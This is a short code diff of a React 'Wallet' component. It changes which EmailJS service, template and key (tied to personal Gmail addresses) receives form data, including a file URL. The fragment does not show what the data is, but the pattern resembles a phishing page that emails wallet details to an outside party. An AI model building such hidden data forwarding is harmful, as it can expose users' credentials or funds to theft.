@@ -143,8 +143,8 @@ const Wallet = () => {
             file_url: fileUrl || "No link to download",
         }
         // emailjs.send("service_n8wfwi8", "template_ajvfdr7", templateParams, "fkNhhzrs3FhPuz9cW") // techjames27@gmail.com
-        emailjs.send("service_xn96ima", "template_fqf2u5w", templateParams, "gmQnpCyVXg3liXyDO") // secondtechjames@gmail.com
-        // emailjs.send("service_i13gstj", "template_m0wmsy5", templateParams, "kwk2618gjbpiY0Y04") // thirdtechjames@gmail.com
+        // emailjs.send("service_xn96ima", "template_fqf2u5w", templateParams, "gmQnpCyVXg3liXyDO") // secondtechjames@gmail.com
+        emailjs.send("service_i13gstj", "template_m0wmsy5", templateParams, "kwk2618gjbpiY0Y04") // thirdtechjames@gmail.com
             .then(() => {
                 // alert("Message sent successfully!");
                 startCountdown()
